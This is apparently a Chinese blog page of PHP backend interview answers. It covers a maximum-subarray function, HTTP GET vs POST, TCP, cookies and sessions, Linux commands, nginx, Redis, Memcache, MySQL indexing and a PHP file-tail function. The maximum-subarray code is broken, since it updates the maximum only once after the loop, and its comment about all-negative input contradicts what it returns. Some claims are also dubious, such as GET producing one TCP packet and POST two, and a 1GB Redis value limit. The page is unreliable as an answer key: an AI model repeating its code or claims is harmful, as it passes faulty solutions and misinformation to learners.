<h3 id="11-编写一个PHP函数，求任意n个正负整数里面最大的连续和，要求算法时间复杂度尽可能低。"><a href="#11-编写一个PHP函数，求任意n个正负整数里面最大的连续和，要求算法时间复杂度尽可能低。" class="headerlink" title="11.编写一个PHP函数，求任意n个正负整数里面最大的连续和，要求算法时间复杂度尽可能低。#"></a>11.编写一个PHP函数，求任意n个正负整数里面最大的连续和，要求算法时间复杂度尽可能低。<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzExJUU3JUJDJTk2JUU1JTg2JTk5JUU0JUI4JTgwJUU0JUI4JUFBUEhQJUU1JTg3JUJEJUU2JTk1JUIwJUU2JUIxJTgyJUU0JUJCJUJCJUU2JTg0JThGbiVFNCVCOCVBQSVFNiVBRCVBMyVFOCVCNCU5RiVFNiU5NSVCNCVFNiU5NSVCMCVFOSU4NyU4QyVFOSU5RCVBMiVFNiU5QyU4MCVFNSVBNCVBNyVFNyU5QSU4NCVFOCVCRiU5RSVFNyVCQiVBRCVFNSU5MiU4QyVFOCVBNiU4MSVFNiVCMSU4MiVFNyVBRSU5NyVFNiVCMyU5NSVFNiU5NyVCNiVFOSU5NyVCNCVFNSVBNCU4RCVFNiU5RCU4MiVFNSVCQSVBNiVFNSVCMCVCRCVFNSU4RiVBRiVFOCU4MyVCRCVFNCVCRCU4RQ==">#<i class="fa fa-external-link-alt"></i></span></h3><p>思路：动态规划</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取最大的连续和</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  array $arr </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> int </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">max_sum_array</span>(<span class="params"><span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$currSum</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$maxSum</span> = <span class="number">0</span>;<span class="comment">//数组元素全为负的情况，返回最大数</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$n</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$currSum</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$currSum</span> += <span class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$currSum</span> = <span class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$currSum</span> &gt; <span class="variable">$maxSum</span>) &#123;</span><br><span class="line">        <span class="variable">$maxSum</span> = <span class="variable">$currSum</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$maxSum</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络#"></a>计算机网络<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIyVFOCVBRSVBMSVFNyVBRSU5NyVFNiU5QyVCQSVFNyVCRCU5MSVFNyVCQiU5Qw==">#<i class="fa fa-external-link-alt"></i></span></h2><h3 id="1-HTTP中GET与POST的区别，注意最后一条"><a href="#1-HTTP中GET与POST的区别，注意最后一条" class="headerlink" title="1.HTTP中GET与POST的区别，注意最后一条#"></a>1.HTTP中GET与POST的区别，注意最后一条<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzFIVFRQJUU0JUI4JUFER0VUJUU0JUI4JThFUE9TVCVFNyU5QSU4NCVFNSU4QyVCQSVFNSU4OCVBQiVFNiVCMyVBOCVFNiU4NCU4RiVFNiU5QyU4MCVFNSU5MCU4RSVFNCVCOCU4MCVFNiU5RCVBMQ==">#<i class="fa fa-external-link-alt"></i></span></h3><ol>
<li>GET在浏览器回退时是无害的，而POST会再次提交请求。</li>
<li>GET产生的URL地址可以被Bookmark，而POST不可以。</li>
<li>GET请求会被浏览器主动cache，而POST不会，除非手动设置。</li>
<li>GET请求只能进行url编码，而POST支持多种编码方式。</li>
<li>GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。</li>
<li>GET请求在URL中传送的参数是有长度限制的，而POST没有。</li>
<li>对参数的数据类型，GET只接受ASCII字符，而POST没有限制。</li>
<li>GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。</li>
<li>GET参数通过URL传递，POST放在Request body中。</li>
<li>GET产生一个TCP数据包，POST产生两个TCP数据包。</li>
</ol>
<h3 id="2-为什么Tcp连接是三次，挥手是四次"><a href="#2-为什么Tcp连接是三次，挥手是四次" class="headerlink" title="2.为什么Tcp连接是三次，挥手是四次#"></a>2.为什么Tcp连接是三次，挥手是四次<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzIlRTQlQjglQkElRTQlQkIlODAlRTQlQjklODhUY3AlRTglQkYlOUUlRTYlOEUlQTUlRTYlOTglQUYlRTQlQjglODklRTYlQUMlQTElRTYlOEMlQTUlRTYlODklOEIlRTYlOTglQUYlRTUlOUIlOUIlRTYlQUMlQTE=">#<i class="fa fa-external-link-alt"></i></span></h3><p>在Tcp连接中，服务端的SYN和ACK向客户端发送是一次性发送的，而在断开连接的过程中，B端向A端发送的ACK和FIN是分两次发送的。因为在B端接收到A端的FIN后，B端可能还有数据要传输，所以先发送ACK，等B端处理完自己的事情后就可以发送FIN断开连接了。</p>
<h3 id="3-Cookie存在哪"><a href="#3-Cookie存在哪" class="headerlink" title="3.Cookie存在哪#"></a>3.Cookie存在哪<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzNDb29raWUlRTUlQUQlOTglRTUlOUMlQTglRTUlOTMlQUE=">#<i class="fa fa-external-link-alt"></i></span></h3><ol>
<li>如果设置了过期时间，Cookie存在硬盘里</li>
<li>没有设置过期时间，Cookie存在内存里</li>
</ol>
<h3 id="4-COOKIE和SESSION的区别和关系"><a href="#4-COOKIE和SESSION的区别和关系" class="headerlink" title="4.COOKIE和SESSION的区别和关系#"></a>4.COOKIE和SESSION的区别和关系<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzRDT09LSUUlRTUlOTIlOENTRVNTSU9OJUU3JTlBJTg0JUU1JThDJUJBJUU1JTg4JUFCJUU1JTkyJThDJUU1JTg1JUIzJUU3JUIzJUJC">#<i class="fa fa-external-link-alt"></i></span></h3><ol>
<li>COOKIE保存在客户端，而SESSION则保存在服务器端</li>
<li>从安全性来讲，SESSION的安全性更高</li>
<li>从保存内容的类型的角度来讲，COOKIE只保存字符串（及能够自动转换成字符串）</li>
<li>从保存内容的大小来看，COOKIE保存的内容是有限的，比较小，而SESSION基本上没有这个限制</li>
<li>从性能的角度来讲，用SESSION的话，对服务器的压力会更大一些</li>
<li>SEEION依赖于COOKIE，但如果禁用COOKIE，也可以通过url传递</li>
</ol>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux#"></a>Linux<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnI0xpbnV4">#<i class="fa fa-external-link-alt"></i></span></h2><h3 id="1-如何修改文件为当前用户只读"><a href="#1-如何修改文件为当前用户只读" class="headerlink" title="1.如何修改文件为当前用户只读#"></a>1.如何修改文件为当前用户只读<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzElRTUlQTYlODIlRTQlQkQlOTUlRTQlQkYlQUUlRTYlOTQlQjklRTYlOTYlODclRTQlQkIlQjYlRTQlQjglQkElRTUlQkQlOTMlRTUlODklOEQlRTclOTQlQTglRTYlODglQjclRTUlOEYlQUElRTglQUYlQkI=">#<i class="fa fa-external-link-alt"></i></span></h3><p>chmod u&#x3D;r 文件名</p>
<h3 id="2-Linux进程属性"><a href="#2-Linux进程属性" class="headerlink" title="2.Linux进程属性#"></a>2.Linux进程属性<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzJMaW51eCVFOCVCRiU5QiVFNyVBOCU4QiVFNSVCMSU5RSVFNiU4MCVBNw==">#<i class="fa fa-external-link-alt"></i></span></h3><ol>
<li>进程：是用pid表示，它的数值是唯一的</li>
<li>父进程：用ppid表示</li>
<li>启动进程的用户：用UID表示</li>
<li>启动进程的用户所属的组：用GID表示</li>
<li>进程的状态：运行R，就绪W，休眠S，僵尸Z</li>
</ol>
<h3 id="3-统计某一天网站的访问量"><a href="#3-统计某一天网站的访问量" class="headerlink" title="3.统计某一天网站的访问量#"></a>3.统计某一天网站的访问量<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzMlRTclQkIlOUYlRTglQUUlQTElRTYlOUYlOTAlRTQlQjglODAlRTUlQTQlQTklRTclQkQlOTElRTclQUIlOTklRTclOUElODQlRTglQUUlQkYlRTklOTclQUUlRTklODclOEY=">#<i class="fa fa-external-link-alt"></i></span></h3><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> /<span class="keyword">var</span>/<span class="built_in">log</span>/access.<span class="built_in">log</span> | <span class="built_in">sort</span> | uniq | wc -l</span><br></pre></td></tr></table></figure>

<p>推荐篇文章，讲awk实际使用的<span class="exturl" data-url="aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2EvMTE5MDAwMDAwOTc0NTEzOQ==">shell在手分析服务器日志不愁<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx#"></a>Nginx<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnI05naW54">#<i class="fa fa-external-link-alt"></i></span></h2><h3 id="1-fastcgi通过端口监听和通过文件监听的区别"><a href="#1-fastcgi通过端口监听和通过文件监听的区别" class="headerlink" title="1.fastcgi通过端口监听和通过文件监听的区别#"></a>1.fastcgi通过端口监听和通过文件监听的区别<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzFmYXN0Y2dpJUU5JTgwJTlBJUU4JUJGJTg3JUU3JUFCJUFGJUU1JThGJUEzJUU3JTlCJTkxJUU1JTkwJUFDJUU1JTkyJThDJUU5JTgwJTlBJUU4JUJGJTg3JUU2JTk2JTg3JUU0JUJCJUI2JUU3JTlCJTkxJUU1JTkwJUFDJUU3JTlBJTg0JUU1JThDJUJBJUU1JTg4JUFC">#<i class="fa fa-external-link-alt"></i></span></h3><table>
<thead>
<tr>
<th>监听方式</th>
<th>形式</th>
<th>nginx链接fastcgi方式</th>
</tr>
</thead>
<tbody><tr>
<td>端口监听</td>
<td>fastcgi_pass 127.0.0.1:9000</td>
<td>TCP链接</td>
</tr>
<tr>
<td>文件监听</td>
<td>fastcgi_pass &#x2F;tmp&#x2F;php_cgi.sock</td>
<td>Unix domain Socket</td>
</tr>
</tbody></table>
<h3 id="2-nginx的负载均衡实现方式"><a href="#2-nginx的负载均衡实现方式" class="headerlink" title="2.nginx的负载均衡实现方式#"></a>2.nginx的负载均衡实现方式<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzJuZ2lueCVFNyU5QSU4NCVFOCVCNCU5RiVFOCVCRCVCRCVFNSU5RCU4NyVFOCVBMSVBMSVFNSVBRSU5RSVFNyU4RSVCMCVFNiU5NiVCOSVFNSVCQyU4Rg==">#<i class="fa fa-external-link-alt"></i></span></h3><ol>
<li>轮询</li>
<li>用户IP哈希</li>
<li>指定权重</li>
<li>fair（第三方）</li>
<li>url_hash（第三方）</li>
</ol>
<h2 id="Memcache-Redis"><a href="#Memcache-Redis" class="headerlink" title="Memcache&#x2F;Redis#"></a>Memcache&#x2F;Redis<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnI01lbWNhY2hlUmVkaXM=">#<i class="fa fa-external-link-alt"></i></span></h2><h3 id="1-Redis主从是怎样同步数据的？（即复制功能）"><a href="#1-Redis主从是怎样同步数据的？（即复制功能）" class="headerlink" title="1.Redis主从是怎样同步数据的？（即复制功能）#"></a>1.Redis主从是怎样同步数据的？（即复制功能）<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzFSZWRpcyVFNCVCOCVCQiVFNCVCQiU4RSVFNiU5OCVBRiVFNiU4MCU4RSVFNiVBMCVCNyVFNSU5MCU4QyVFNiVBRCVBNSVFNiU5NSVCMCVFNiU4RCVBRSVFNyU5QSU4NCVFNSU4RCVCMyVFNSVBNCU4RCVFNSU4OCVCNiVFNSU4QSU5RiVFOCU4MyVCRA==">#<i class="fa fa-external-link-alt"></i></span></h3><p>无论是初次连接还是重新连接，当建立一个从服务器时，从服务器都将从主服务器发送一个SYNC命令。接到SYNC命令的主服务器将开始执行BGSAVE，并在保存操作执行期间，将所有新执行的命令都保存到一个缓冲区里面，当BGSAVE执行完毕后，主服务器将执行保存操作所得到的.rdb文件发送给从服务器，从服务器接收这个.rdb文件，并将文件中的数据载入到内存中。之后主服务器会以Redis命令协议的格式，将写命令缓冲区中积累的所有内容都发送给从服务器。</p>
<h3 id="2-Memcache缓存命中率"><a href="#2-Memcache缓存命中率" class="headerlink" title="2.Memcache缓存命中率#"></a>2.Memcache缓存命中率<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzJNZW1jYWNoZSVFNyVCQyU5MyVFNSVBRCU5OCVFNSU5MSVCRCVFNCVCOCVBRCVFNyU4RSU4Nw==">#<i class="fa fa-external-link-alt"></i></span></h3><p>缓存命中率 &#x3D; get_hits&#x2F;cmd_get * 100%</p>
<h3 id="3-Memcache集群实现"><a href="#3-Memcache集群实现" class="headerlink" title="3.Memcache集群实现#"></a>3.Memcache集群实现<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzNNZW1jYWNoZSVFOSU5QiU4NiVFNyVCRSVBNCVFNSVBRSU5RSVFNyU4RSVCMA==">#<i class="fa fa-external-link-alt"></i></span></h3><p>一致性Hash</p>
<h3 id="4-Memcache与Redis的区别"><a href="#4-Memcache与Redis的区别" class="headerlink" title="4.Memcache与Redis的区别#"></a>4.Memcache与Redis的区别<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzRNZW1jYWNoZSVFNCVCOCU4RVJlZGlzJUU3JTlBJTg0JUU1JThDJUJBJUU1JTg4JUFC">#<i class="fa fa-external-link-alt"></i></span></h3><ol>
<li>Memcache<ul>
<li>该产品本身特别是数据在内存里边的存储，如果服务器突然断电，则全部数据就会丢失</li>
<li>单个key（变量）存放的数据有1M的限制</li>
<li>存储数据的类型都是String字符串类型</li>
<li>本身没有持久化功能</li>
<li>可以使用多核（多线程）</li>
</ul>
</li>
<li>Redis<ul>
<li>数据类型比较丰富:String、List、Set、Sortedset、Hash</li>
<li>有持久化功能，可以把数据随时存储在磁盘上</li>
<li>本身有一定的计算功能</li>
<li>单个key（变量）存放的数据有1GB的限制</li>
</ul>
</li>
</ol>
<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL#"></a>MySQL<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnI015U1FM">#<i class="fa fa-external-link-alt"></i></span></h2><h3 id="1-执行SQL语句：select-count-from-articles-时，MyISAM和InnoDB哪个快"><a href="#1-执行SQL语句：select-count-from-articles-时，MyISAM和InnoDB哪个快" class="headerlink" title="1.执行SQL语句：select count(*) from articles 时，MyISAM和InnoDB哪个快#"></a>1.执行SQL语句：select count(*) from articles 时，MyISAM和InnoDB哪个快<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzElRTYlODklQTclRTglQTElOENTUUwlRTglQUYlQUQlRTUlOEYlQTVzZWxlY3QtY291bnQtZnJvbS1hcnRpY2xlcy0lRTYlOTclQjZNeUlTQU0lRTUlOTIlOENJbm5vREIlRTUlOTMlQUElRTQlQjglQUElRTUlQkYlQUI=">#<i class="fa fa-external-link-alt"></i></span></h3><p>MyISAM快，因为MyISAM本身就记录了数量，而InnoDB要扫描数据</p>
<h3 id="3-隐式转换"><a href="#3-隐式转换" class="headerlink" title="3.隐式转换#"></a>3.隐式转换<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzMlRTklOUElOTAlRTUlQkMlOEYlRTglQkQlQUMlRTYlOEQlQTI=">#<i class="fa fa-external-link-alt"></i></span></h3><ul>
<li>当查询字段是INT类型，如果查询条件为CHAR，将查询条件转换为INT，如果是字符串前导都是数字将会进行截取，如果不是转换为0。</li>
<li>当查询字段是CHAR&#x2F;VARCHAR类型，如果查询条件为INT，将查询字段为换为INT再进行比较，可能会造成全表扫描</li>
</ul>
<h3 id="2-最左前缀原则"><a href="#2-最左前缀原则" class="headerlink" title="2.最左前缀原则#"></a>2.最左前缀原则<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzIlRTYlOUMlODAlRTUlQjclQTYlRTUlODklOEQlRTclQkMlODAlRTUlOEUlOUYlRTUlODglOTk=">#<i class="fa fa-external-link-alt"></i></span></h3><p>有一个复合索引：<code>INDEX(`a`, `b`, `c`)</code></p>
<table>
<thead>
<tr>
<th>使用方式</th>
<th>能否用上索引</th>
</tr>
</thead>
<tbody><tr>
<td>select * from users where a &#x3D; 1 and b &#x3D; 2</td>
<td>能用上a、b</td>
</tr>
<tr>
<td>select * from users where b &#x3D; 2 and a &#x3D; 1</td>
<td>能用上a、b（有MySQL查询优化器）</td>
</tr>
<tr>
<td>select * from users where a &#x3D; 2 and c &#x3D; 1</td>
<td>能用上a</td>
</tr>
<tr>
<td>select * from users where b &#x3D; 2 and c &#x3D; 1</td>
<td>不能</td>
</tr>
</tbody></table>
<h3 id="3-聚簇索引和非聚簇索引的区别"><a href="#3-聚簇索引和非聚簇索引的区别" class="headerlink" title="3.聚簇索引和非聚簇索引的区别#"></a>3.聚簇索引和非聚簇索引的区别<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzMlRTglODElOUElRTclQjAlODclRTclQjQlQTIlRTUlQkMlOTUlRTUlOTIlOEMlRTklOUQlOUUlRTglODElOUElRTclQjAlODclRTclQjQlQTIlRTUlQkMlOTUlRTclOUElODQlRTUlOEMlQkElRTUlODglQUI=">#<i class="fa fa-external-link-alt"></i></span></h3><p>聚簇索引的叶节点就是数据节点，而非聚簇索引的页节点仍然是索引检点，并保留一个链接指向对应数据块。</p>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP#"></a>PHP<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnI1BIUA==">#<i class="fa fa-external-link-alt"></i></span></h2><h3 id="1-Session可不可以设置失效时间，比如30分钟过期"><a href="#1-Session可不可以设置失效时间，比如30分钟过期" class="headerlink" title="1.Session可不可以设置失效时间，比如30分钟过期#"></a>1.Session可不可以设置失效时间，比如30分钟过期<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzFTZXNzaW9uJUU1JThGJUFGJUU0JUI4JThEJUU1JThGJUFGJUU0JUJCJUE1JUU4JUFFJUJFJUU3JUJEJUFFJUU1JUE0JUIxJUU2JTk1JTg4JUU2JTk3JUI2JUU5JTk3JUI0JUU2JUFGJTk0JUU1JUE2JTgyMzAlRTUlODglODYlRTklOTIlOUYlRTglQkYlODclRTYlOUMlOUY=">#<i class="fa fa-external-link-alt"></i></span></h3><ol>
<li>设置seesion.cookie_lifetime有30分钟，并设置session.gc_maxlifetime为30分钟</li>
<li>自己为每一个Session值增加timestamp</li>
<li>每次访问之前, 判断时间戳</li>
</ol>
<h3 id="2-PHP进程间通信的几种方式"><a href="#2-PHP进程间通信的几种方式" class="headerlink" title="2.PHP进程间通信的几种方式#"></a>2.PHP进程间通信的几种方式<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzJQSFAlRTglQkYlOUIlRTclQTglOEIlRTklOTclQjQlRTklODAlOUElRTQlQkYlQTElRTclOUElODQlRTUlODclQTAlRTclQTclOEQlRTYlOTYlQjklRTUlQkMlOEY=">#<i class="fa fa-external-link-alt"></i></span></h3><ul>
<li>消息队列</li>
<li>信号量+共享内存</li>
<li>信号</li>
<li>管道</li>
<li>socket</li>
</ul>
<h3 id="3-php类的静态调用和实例化调用各自的利弊"><a href="#3-php类的静态调用和实例化调用各自的利弊" class="headerlink" title="3.php类的静态调用和实例化调用各自的利弊#"></a>3.php类的静态调用和实例化调用各自的利弊<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzNwaHAlRTclQjElQkIlRTclOUElODQlRTklOUQlOTklRTYlODAlODElRTglQjAlODMlRTclOTQlQTglRTUlOTIlOEMlRTUlQUUlOUUlRTQlQkUlOEIlRTUlOEMlOTYlRTglQjAlODMlRTclOTQlQTglRTUlOTAlODQlRTglODclQUElRTclOUElODQlRTUlODglQTklRTUlQkMlOEE=">#<i class="fa fa-external-link-alt"></i></span></h3><p>静态方法是类中的一个成员方法，属于整个类，即使不用创建任何对象也可以直接调用！静态方法效率上要比实例化高，静态方法的缺点是不自动销毁，而实例化的则可以做销毁。</p>
<h3 id="4-类的数组方式调用"><a href="#4-类的数组方式调用" class="headerlink" title="4.类的数组方式调用#"></a>4.类的数组方式调用<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzQlRTclQjElQkIlRTclOUElODQlRTYlOTUlQjAlRTclQkIlODQlRTYlOTYlQjklRTUlQkMlOEYlRTglQjAlODMlRTclOTQlQTg=">#<i class="fa fa-external-link-alt"></i></span></h3><p>ArrayAccess（数组式访问）接口</p>
<h3 id="5-用php写一个函数，获取一个文本文件最后n行内容，要求尽可能效率高，并可以跨平台使用。"><a href="#5-用php写一个函数，获取一个文本文件最后n行内容，要求尽可能效率高，并可以跨平台使用。" class="headerlink" title="5.用php写一个函数，获取一个文本文件最后n行内容，要求尽可能效率高，并可以跨平台使用。#"></a>5.用php写一个函数，获取一个文本文件最后n行内容，要求尽可能效率高，并可以跨平台使用。<span class="exturl" data-url="aHR0cDovL2NvZmZlZXBocC5jb20vYXJ0aWNsZXMvND91dG1fc291cmNlPWxhcmF2ZWwtY2hpbmEub3JnIzUlRTclOTQlQThwaHAlRTUlODYlOTklRTQlQjglODAlRTQlQjglQUElRTUlODclQkQlRTYlOTUlQjAlRTglOEUlQjclRTUlOEYlOTYlRTQlQjglODAlRTQlQjglQUElRTYlOTYlODclRTYlOUMlQUMlRTYlOTYlODclRTQlQkIlQjYlRTYlOUMlODAlRTUlOTAlOEVuJUU4JUExJThDJUU1JTg2JTg1JUU1JUFFJUI5JUU4JUE2JTgxJUU2JUIxJTgyJUU1JUIwJUJEJUU1JThGJUFGJUU4JTgzJUJEJUU2JTk1JTg4JUU3JThFJTg3JUU5JUFCJTk4JUU1JUI5JUI2JUU1JThGJUFGJUU0JUJCJUE1JUU4JUI3JUE4JUU1JUI5JUIzJUU1JThGJUIwJUU0JUJEJUJGJUU3JTk0JUE4">#<i class="fa fa-external-link-alt"></i></span></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tail</span>(<span class="params"><span class="variable">$file</span>, <span class="variable">$num</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>,<span class="string">&quot;r&quot;</span>);  </span><br><span class="line">    <span class="variable">$pos</span> = -<span class="number">2</span>;</span><br><span class="line">    <span class="variable">$eof</span> = <span class="string">&quot;&quot;</span>;  </span><br><span class="line">    <span class="variable">$head</span> = <span class="literal">false</span>;   <span class="comment">//当总行数小于Num时，判断是否到第一行了  </span></span><br><span class="line">    <span class="variable">$lines</span> = <span class="keyword">array</span>();  </span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$num</span> &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$eof</span> != PHP_EOL)&#123;  </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">fseek</span>(<span class="variable">$fp</span>, <span class="variable">$pos</span>, SEEK_END) == <span class="number">0</span>) &#123;    <span class="comment">//fseek成功返回0，失败返回-1  </span></span><br><span class="line">                <span class="variable">$eof</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$fp</span>);</span><br><span class="line">                <span class="variable">$pos</span>--;  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;                            <span class="comment">//当到达第一行，行首时，设置$pos失败  </span></span><br><span class="line">                <span class="title function_ invoke__">fseek</span>(<span class="variable">$fp</span>, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">                <span class="variable">$head</span> = <span class="literal">true</span>;                   <span class="comment">//到达文件头部，开关打开  </span></span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$lines</span>, <span class="title function_ invoke__">str_replace</span>(PHP_EOL, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)));   </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$head</span>) &#123;<span class="comment">//这一句，只能放上一句后，因为到文件头后，把第一行读取出来再跳出整个循环  </span></span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        &#125;                 </span><br><span class="line">        <span class="variable">$eof</span> = <span class="string">&quot;&quot;</span>;  </span><br><span class="line">        <span class="variable">$num</span>--;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$lines</span>;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

